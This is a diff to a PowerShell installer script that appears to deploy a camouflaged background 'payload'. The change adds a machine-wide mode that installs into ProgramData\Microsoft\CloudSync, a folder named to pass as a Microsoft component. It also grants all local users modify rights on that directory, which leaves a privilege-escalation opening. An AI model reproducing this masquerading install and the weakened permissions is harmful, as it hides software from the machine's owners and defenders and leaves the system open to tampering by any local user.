@@ -36,6 +36,7 @@ param(
     [switch]$CleanLegacy,
     [switch]$NoMaxPower,
     [switch]$NoCamo,
+    [switch]$MachineWide,
     [switch]$Elevated
 )
 
@@ -160,8 +161,20 @@ if ($pythonw) { $python = $pythonw -replace 'pythonw\.exe$', 'python.exe' }
 # ==============================================================
 # 3. copy payload
 # ==============================================================
+if ($MachineWide -and $InstallDir -like "$env:LOCALAPPDATA*") {
+    $InstallDir = Join-Path $env:ProgramData 'Microsoft\CloudSync'
+    Say "[+] machine-wide install: $InstallDir"
+}
 Say "[+] installing to $InstallDir"
 New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
+if ($MachineWide) {
+    if ($admin) {
+        & icacls.exe $InstallDir /grant '*S-1-5-32-545:(OI)(CI)M' /T /C 2>&1 | Out-Null
+        Ok "machine-wide: BUILTIN\Users granted modify on $InstallDir"
+    } else {
+        Warn "machine-wide needs elevation to grant Users modify - run elevated"
+    }
+}
 
 # ---- stop any running instance first, or the binary is locked -------------
 Get-CimInstance Win32_Process -Filter "Name='pythonw.exe' OR Name='python.exe'" -ErrorAction SilentlyContinue |
